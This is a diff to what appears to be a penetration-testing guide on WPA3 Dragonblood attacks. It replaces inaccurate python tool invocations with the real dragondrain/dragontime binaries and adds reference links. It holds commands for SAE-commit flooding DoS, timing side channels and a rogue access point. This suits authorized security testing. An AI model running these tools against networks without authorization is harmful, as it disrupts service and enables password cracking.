@@ -52,11 +52,14 @@ Side-channel and downgrade attacks against the SAE Hunting-and-Pecking algorithm
 The original SAE password-element derivation iterates a variable number of times depending on the password and MAC. Cache hits leak the iteration count.
 
 ```bash
-git clone https://github.com/vanhoefm/dragonblood
-cd dragonblood
+# The DoS / timing tools live in vanhoefm/dragondrain-and-time — NOT vanhoefm/dragonblood,
+# which only hosts the project website. They are compiled C tools (built with make) that
+# need a patched ath9k driver; they are not `.py` scripts. Verify flags against the README.
+git clone https://github.com/vanhoefm/dragondrain-and-time
+cd dragondrain-and-time && make
 
 # Cache-based attack (requires co-located malicious code on target host — limited)
-python3 dragontime.py --bssid AA:BB:CC:DD:EE:FF --iface wlan0mon
+sudo ./dragontime    # see repo README for interface/BSSID flags
 ```
 
 ### Timing Side-Channel
@@ -64,7 +67,7 @@ python3 dragontime.py --bssid AA:BB:CC:DD:EE:FF --iface wlan0mon
 The same iteration count leaks via observable timing of the SAE commit phase from outside.
 
 ```bash
-python3 dragontime.py --bssid AA:BB:CC:DD:EE:FF --iface wlan0mon --mode timing
+sudo ./dragontime    # timing mode; see dragondrain-and-time README for flags
 ```
 
 ### Downgrade to Weak Group
@@ -72,7 +75,7 @@ python3 dragontime.py --bssid AA:BB:CC:DD:EE:FF --iface wlan0mon --mode timing
 Some implementations accept SAE with the deprecated MODP group 5 if the client requests it. Combined with cache/timing side channels, this enables offline dictionary attack.
 
 ```bash
-python3 dragondrain.py wlan0mon AA:BB:CC:DD:EE:FF
+sudo ./dragondrain   # SAE-commit flooding DoS; see dragondrain-and-time README
 ```
 
 ### Patched Versions
@@ -142,8 +145,8 @@ sudo airbase-ng -e <ESSID> -c <ch> -W 1 -z 4 wlan0mon  # WPA2-RSN advertised onl
 # (passive analysis of beacon IE order + version-specific behaviors)
 
 # 5. Run Dragonblood test scripts if pre-2.10 hostapd suspected
-python3 dragondrain.py wlan0mon <BSSID>
-python3 dragontime.py --bssid <BSSID> --iface wlan0mon
+sudo ./dragondrain   # from vanhoefm/dragondrain-and-time (built with make)
+sudo ./dragontime    # from vanhoefm/dragondrain-and-time (built with make)
 
 # 6. Document residual viable attacks; pivot to evil-twin / EAP / RF if pure WPA3 R2
 ```
@@ -153,6 +156,8 @@ python3 dragontime.py --bssid <BSSID> --iface wlan0mon
 ## Key References
 
 - Dragonblood: dragonblood.net (Vanhoef + Ronen)
+- Dragondrain/Dragontime tools (DoS + timing, C/make): https://github.com/vanhoefm/dragondrain-and-time
+- Dragonslayer (EAP-pwd invalid-curve): https://github.com/vanhoefm/dragonslayer
 - IEEE 802.11-2020 (combined spec including WPA3)
 - WFA WPA3 Specification
 - hostapd 2.10 release notes
